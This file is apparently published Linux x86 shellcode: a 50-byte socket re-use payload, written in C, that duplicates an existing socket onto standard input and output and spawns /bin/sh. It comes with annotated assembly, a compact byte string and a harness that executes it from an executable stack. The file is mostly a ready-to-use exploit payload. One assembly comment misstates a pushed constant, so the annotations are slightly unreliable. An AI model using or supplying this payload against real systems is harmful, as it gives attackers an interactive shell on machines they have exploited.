/* Socket Re-use Combo for linux x86 systems by ZadYree -- 50 bytes
 * <zadyree@tuxfamily.org>
 *
 * Made using sockfd trick + dup2(0,0), dup2(0,1), dup2(0,2) +
 * execve /bin/sh
 *
 * Thanks: Charles Stevenson, ipv, 3LRVS research team
 *
 * gcc -o socket_reuse socket_reuse.c -z execstack
 */

char shellcode[]= /* We use sys_dup(2) to get the previous attributed sockfd */
"\x6a\x02"      // push 0x2
"\x5b"          // pop ebx
"\x6a\x29"      // push 0x29
"\x58"          // pop eax
"\xcd\x80"      // int 0x80 -> call dup(2)
"\x48"          // dec eax
/* Now EAX = our Socket File Descriptor */

"\x89\xc6"      // mov esi, eax

/* dup2(fd,0); dup2(fd,1); dup2(fd,2); */
"\x31\xc9"                  // xor    %ecx,%ecx
"\x56"                      // push   %esi
"\x5b"                      // pop    %ebx
// loop:
"\x6a\x3f"                  // push   $0x3f
"\x58"                      // pop    %eax
"\xcd\x80"                  // int    $0x80
"\x41"                      // inc    %ecx
"\x80\xf9\x03"              // cmp    $0x3,%cl
"\x75\xf5"                  // jne    80483e8 <loop>

/* execve /bin/sh by ipv */
"\x6a\x0b"                  // push byte 0xb
"\x58"                      // pop eax
"\x99"                      // cdq
"\x52"                      // push edx
"\x31\xf6"                  // xor esi, esi - We add those instructions
"\x56"                      // push esi     - to clean up the arg stack
"\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
"\x68\x2f\x62\x69\x6e"      // push dword 0x6e69922f
"\x89\xe3"                  // mov ebx, esp
"\x31\xc9"                  // xor ecx, ecx
"\xcd\x80";                 // int 0x80
;

/*

shellcode[]=
"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\xcd\x80";

*/


int main(void)
{
  printf("Shellcode length: %d\n", strlen(shellcode));
  (*(void(*)()) shellcode)();
  return 0;
}